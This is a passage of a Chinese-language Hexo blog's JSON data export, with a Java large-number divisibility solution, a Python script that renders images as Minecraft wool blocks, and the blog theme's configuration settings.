class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6</span><br><span class=\"line\">101 101</span><br><span class=\"line\">0 67</span><br><span class=\"line\">-101 101</span><br><span class=\"line\">7678123668327637674887634 101</span><br><span class=\"line\">11010000000000000000 256</span><br><span class=\"line\">-202202202202000202202202 -101</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Case 1: divisible</span><br><span class=\"line\">Case 2: divisible</span><br><span class=\"line\">Case 3: divisible</span><br><span class=\"line\">Case 4: not divisible</span><br><span class=\"line\">Case 5: divisible</span><br><span class=\"line\">Case 6: divisible</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><p><strong>java暴力代码</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.math.BigInteger;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tScanner sc=<span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">\t\tBigInteger a,b;</span><br><span class=\"line\">\t\tInteger T = sc.nextInt(),k=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(T--&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t\ta = sc.nextBigInteger();</span><br><span class=\"line\">\t\t\tb = sc.nextBigInteger();</span><br><span class=\"line\">\t\t\ta = a.abs();</span><br><span class=\"line\">\t\t\tb = b.abs();</span><br><span class=\"line\">\t\t\tSystem.out.print(<span class=\"string\">&quot;Case &quot;</span> + k++ +<span class=\"string\">&quot;: &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a.mod(b) == BigInteger.valueOf(<span class=\"number\">0</span>))System.out.println(<span class=\"string\">&quot;divisible&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> System.out.println(<span class=\"string\">&quot;not divisible&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Minecraft Python绘图","date":"2020-04-08T08:08:24.000Z","abbrlink":"566b0d1e","_content":"<font color=\"red\">前置条件：</font>\n> 模组: RaspberryJamMod \n> Python库: mcpi\n> 游戏版本: 1.8 ~ 1.12.2\n\n<!--more-->\n```py\nfrom mcpi import minecraft, block\nfrom colorsys import rgb_to_hsv\nfrom PIL import Image\nimport numpy\n\ncolors = dict((\n    ((255, 255, 255), \"0\"), # white 白色\n    ((249, 255, 254), \"0\"),  # white 白色\n    ((249, 128, 29), \"1\"),  # orange 橙色\n    ((199, 78, 189), \"2\"),  # magenta 品红色\n    ((58, 179, 218), \"3\"),  # light_blue 淡蓝色\n    ((254, 216, 61), \"4\"),  # yellow 黄色\n    ((128, 199, 31), \"5\"),  # lime 黄绿色\n    ((243, 139, 170), \"6\"),  # pink 粉红色\n    ((71, 79, 82), \"7\"),  # gray 灰色\n    ((157, 157, 151), \"8\"),  # light_gray 淡灰色\n    ((22, 156, 156), \"9\"),  # cyan 青色\n    ((137, 50, 184), \"10\"),  # purple 紫色\n    ((60, 68, 170), \"11\"),  # blue 蓝色\n    ((131, 84, 50), \"12\"),  # brown 棕色\n    ((94, 124, 22), \"13\"),  # green 绿色\n    ((176, 46, 38), \"14\"),  # red 红色\n    ((29, 29, 33), \"15\"),  # black 黑色\n    ((0, 0, 0), \"15\"),  # black 黑色\n\n))\n\n\ndef to_hsv(color):\n    return rgb_to_hsv(*[x / 255.0 for x in color])\n\n\ndef color_dist(c1, c2):\n    return sum((a - b) ** 2 for a, b in zip(to_hsv(c1), to_hsv(c2)))\n\n\ndef min_color_diff(color_to_match, colors):\n    return min((color_dist(color_to_match, test), colors[test]) for test in colors)\n\n\n# 此函数暂时无用\ndef get_player_direction(rotation):\n    rec = [-90, 0, 90, 180]  # +x, +z, -x, -z\n    if abs(rotation) < 45:\n        return '+z'\n    elif abs(rotation) > 145:\n        return '-z'\n    elif rotation < 0:\n        return '+x'\n    else:\n        return '-x'\n\n\nmc = minecraft.Minecraft.create()\nim = Image.open('6.jpg')\nim = im.convert('RGB')\nlist = numpy.array(im)\nsize = list.shape\nstart = mc.player.getTilePos()\nfor i in range(size[0]):\n    for j in range(size[1]):\n        item = min_color_diff(list[i][j], colors)\n        mc.setBlock(start.x + size[0] - i, start.y, start.z + j, 251, int(item[1]))\n```\n<font color=\"red\">效果如下:</font>\n![皮卡丘](https://cdn.file.todest.cn/pic/2019093001.png)\n![晚安](https://cdn.file.todest.cn/pic/2019093002.png)","source":"_posts/Minecraft Python绘图.md","raw":"---\ntitle: Minecraft Python绘图\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - Python\n  - Minecraft\nabbrlink: 566b0d1e\n---\n<font color=\"red\">前置条件：</font>\n> 模组: RaspberryJamMod \n> Python库: mcpi\n> 游戏版本: 1.8 ~ 1.12.2\n\n<!--more-->\n```py\nfrom mcpi import minecraft, block\nfrom colorsys import rgb_to_hsv\nfrom PIL import Image\nimport numpy\n\ncolors = dict((\n    ((255, 255, 255), \"0\"), # white 白色\n    ((249, 255, 254), \"0\"),  # white 白色\n    ((249, 128, 29), \"1\"),  # orange 橙色\n    ((199, 78, 189), \"2\"),  # magenta 品红色\n    ((58, 179, 218), \"3\"),  # light_blue 淡蓝色\n    ((254, 216, 61), \"4\"),  # yellow 黄色\n    ((128, 199, 31), \"5\"),  # lime 黄绿色\n    ((243, 139, 170), \"6\"),  # pink 粉红色\n    ((71, 79, 82), \"7\"),  # gray 灰色\n    ((157, 157, 151), \"8\"),  # light_gray 淡灰色\n    ((22, 156, 156), \"9\"),  # cyan 青色\n    ((137, 50, 184), \"10\"),  # purple 紫色\n    ((60, 68, 170), \"11\"),  # blue 蓝色\n    ((131, 84, 50), \"12\"),  # brown 棕色\n    ((94, 124, 22), \"13\"),  # green 绿色\n    ((176, 46, 38), \"14\"),  # red 红色\n    ((29, 29, 33), \"15\"),  # black 黑色\n    ((0, 0, 0), \"15\"),  # black 黑色\n\n))\n\n\ndef to_hsv(color):\n    return rgb_to_hsv(*[x / 255.0 for x in color])\n\n\ndef color_dist(c1, c2):\n    return sum((a - b) ** 2 for a, b in zip(to_hsv(c1), to_hsv(c2)))\n\n\ndef min_color_diff(color_to_match, colors):\n    return min((color_dist(color_to_match, test), colors[test]) for test in colors)\n\n\n# 此函数暂时无用\ndef get_player_direction(rotation):\n    rec = [-90, 0, 90, 180]  # +x, +z, -x, -z\n    if abs(rotation) < 45:\n        return '+z'\n    elif abs(rotation) > 145:\n        return '-z'\n    elif rotation < 0:\n        return '+x'\n    else:\n        return '-x'\n\n\nmc = minecraft.Minecraft.create()\nim = Image.open('6.jpg')\nim = im.convert('RGB')\nlist = numpy.array(im)\nsize = list.shape\nstart = mc.player.getTilePos()\nfor i in range(size[0]):\n    for j in range(size[1]):\n        item = min_color_diff(list[i][j], colors)\n        mc.setBlock(start.x + size[0] - i, start.y, start.z + j, 251, int(item[1]))\n```\n<font color=\"red\">效果如下:</font>\n![皮卡丘](https://cdn.file.todest.cn/pic/2019093001.png)\n![晚安](https://cdn.file.todest.cn/pic/2019093002.png)","slug":"Minecraft Python绘图","published":1,"updated":"2020-12-01T14:44:18.961Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkb3001hqse58pdzd1d4","content":"<p><font color=\"red\">前置条件：</font></p>\n<blockquote>\n<p>模组: RaspberryJamMod<br>Python库: mcpi<br>游戏版本: 1.8 ~ 1.12.2</p>\n</blockquote>\n<a id=\"more\"></a>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> mcpi <span class=\"keyword\">import</span> minecraft, block</span><br><span class=\"line\"><span class=\"keyword\">from</span> colorsys <span class=\"keyword\">import</span> rgb_to_hsv</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy</span><br><span class=\"line\"></span><br><span class=\"line\">colors = dict((</span><br><span class=\"line\">    ((<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>), <span class=\"string\">&quot;0&quot;</span>), <span class=\"comment\"># white 白色</span></span><br><span class=\"line\">    ((<span class=\"number\">249</span>, <span class=\"number\">255</span>, <span class=\"number\">254</span>), <span class=\"string\">&quot;0&quot;</span>),  <span class=\"comment\"># white 白色</span></span><br><span class=\"line\">    ((<span class=\"number\">249</span>, <span class=\"number\">128</span>, <span class=\"number\">29</span>), <span class=\"string\">&quot;1&quot;</span>),  <span class=\"comment\"># orange 橙色</span></span><br><span class=\"line\">    ((<span class=\"number\">199</span>, <span class=\"number\">78</span>, <span class=\"number\">189</span>), <span class=\"string\">&quot;2&quot;</span>),  <span class=\"comment\"># magenta 品红色</span></span><br><span class=\"line\">    ((<span class=\"number\">58</span>, <span class=\"number\">179</span>, <span class=\"number\">218</span>), <span class=\"string\">&quot;3&quot;</span>),  <span class=\"comment\"># light_blue 淡蓝色</span></span><br><span class=\"line\">    ((<span class=\"number\">254</span>, <span class=\"number\">216</span>, <span class=\"number\">61</span>), <span class=\"string\">&quot;4&quot;</span>),  <span class=\"comment\"># yellow 黄色</span></span><br><span class=\"line\">    ((<span class=\"number\">128</span>, <span class=\"number\">199</span>, <span class=\"number\">31</span>), <span class=\"string\">&quot;5&quot;</span>),  <span class=\"comment\"># lime 黄绿色</span></span><br><span class=\"line\">    ((<span class=\"number\">243</span>, <span class=\"number\">139</span>, <span class=\"number\">170</span>), <span class=\"string\">&quot;6&quot;</span>),  <span class=\"comment\"># pink 粉红色</span></span><br><span class=\"line\">    ((<span class=\"number\">71</span>, <span class=\"number\">79</span>, <span class=\"number\">82</span>), <span class=\"string\">&quot;7&quot;</span>),  <span class=\"comment\"># gray 灰色</span></span><br><span class=\"line\">    ((<span class=\"number\">157</span>, <span class=\"number\">157</span>, <span class=\"number\">151</span>), <span class=\"string\">&quot;8&quot;</span>),  <span class=\"comment\"># light_gray 淡灰色</span></span><br><span class=\"line\">    ((<span class=\"number\">22</span>, <span class=\"number\">156</span>, <span class=\"number\">156</span>), <span class=\"string\">&quot;9&quot;</span>),  <span class=\"comment\"># cyan 青色</span></span><br><span class=\"line\">    ((<span class=\"number\">137</span>, <span class=\"number\">50</span>, <span class=\"number\">184</span>), <span class=\"string\">&quot;10&quot;</span>),  <span class=\"comment\"># purple 紫色</span></span><br><span class=\"line\">    ((<span class=\"number\">60</span>, <span class=\"number\">68</span>, <span class=\"number\">170</span>), <span class=\"string\">&quot;11&quot;</span>),  <span class=\"comment\"># blue 蓝色</span></span><br><span class=\"line\">    ((<span class=\"number\">131</span>, <span class=\"number\">84</span>, <span class=\"number\">50</span>), <span class=\"string\">&quot;12&quot;</span>),  <span class=\"comment\"># brown 棕色</span></span><br><span class=\"line\">    ((<span class=\"number\">94</span>, <span class=\"number\">124</span>, <span class=\"number\">22</span>), <span class=\"string\">&quot;13&quot;</span>),  <span class=\"comment\"># green 绿色</span></span><br><span class=\"line\">    ((<span class=\"number\">176</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>), <span class=\"string\">&quot;14&quot;</span>),  <span class=\"comment\"># red 红色</span></span><br><span class=\"line\">    ((<span class=\"number\">29</span>, <span class=\"number\">29</span>, <span class=\"number\">33</span>), <span class=\"string\">&quot;15&quot;</span>),  <span class=\"comment\"># black 黑色</span></span><br><span class=\"line\">    ((<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>), <span class=\"string\">&quot;15&quot;</span>),  <span class=\"comment\"># black 黑色</span></span><br><span class=\"line\"></span><br><span class=\"line\">))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_hsv</span>(<span class=\"params\">color</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> rgb_to_hsv(*[x / <span class=\"number\">255.0</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> color])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">color_dist</span>(<span class=\"params\">c1, c2</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum((a - b) ** <span class=\"number\">2</span> <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> zip(to_hsv(c1), to_hsv(c2)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">min_color_diff</span>(<span class=\"params\">color_to_match, colors</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> min((color_dist(color_to_match, test), colors[test]) <span class=\"keyword\">for</span> test <span class=\"keyword\">in</span> colors)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 此函数暂时无用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_player_direction</span>(<span class=\"params\">rotation</span>):</span></span><br><span class=\"line\">    rec = [<span class=\"number\">-90</span>, <span class=\"number\">0</span>, <span class=\"number\">90</span>, <span class=\"number\">180</span>]  <span class=\"comment\"># +x, +z, -x, -z</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> abs(rotation) &lt; <span class=\"number\">45</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;+z&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> abs(rotation) &gt; <span class=\"number\">145</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-z&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> rotation &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;+x&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-x&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mc = minecraft.Minecraft.create()</span><br><span class=\"line\">im = Image.open(<span class=\"string\">&#x27;6.jpg&#x27;</span>)</span><br><span class=\"line\">im = im.convert(<span class=\"string\">&#x27;RGB&#x27;</span>)</span><br><span class=\"line\">list = numpy.array(im)</span><br><span class=\"line\">size = list.shape</span><br><span class=\"line\">start = mc.player.getTilePos()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">        item = min_color_diff(list[i][j], colors)</span><br><span class=\"line\">        mc.setBlock(start.x + size[<span class=\"number\">0</span>] - i, start.y, start.z + j, <span class=\"number\">251</span>, int(item[<span class=\"number\">1</span>]))</span><br></pre></td></tr></table></figure>\n<p><font color=\"red\">效果如下:</font><br><img data-src=\"https://cdn.file.todest.cn/pic/2019093001.png\" alt=\"皮卡丘\"><br><img data-src=\"https://cdn.file.todest.cn/pic/2019093002.png\" alt=\"晚安\"></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1716,"excerpt":"<p><font color=\"red\">前置条件：</font></p>\n<blockquote>\n<p>模组: RaspberryJamMod<br>Python库: mcpi<br>游戏版本: 1.8 ~ 1.12.2</p>\n</blockquote>","more":"<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> mcpi <span class=\"keyword\">import</span> minecraft, block</span><br><span class=\"line\"><span class=\"keyword\">from</span> colorsys <span class=\"keyword\">import</span> rgb_to_hsv</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy</span><br><span class=\"line\"></span><br><span class=\"line\">colors = dict((</span><br><span class=\"line\">    ((<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>), <span class=\"string\">&quot;0&quot;</span>), <span class=\"comment\"># white 白色</span></span><br><span class=\"line\">    ((<span class=\"number\">249</span>, <span class=\"number\">255</span>, <span class=\"number\">254</span>), <span class=\"string\">&quot;0&quot;</span>),  <span class=\"comment\"># white 白色</span></span><br><span class=\"line\">    ((<span class=\"number\">249</span>, <span class=\"number\">128</span>, <span class=\"number\">29</span>), <span class=\"string\">&quot;1&quot;</span>),  <span class=\"comment\"># orange 橙色</span></span><br><span class=\"line\">    ((<span class=\"number\">199</span>, <span class=\"number\">78</span>, <span class=\"number\">189</span>), <span 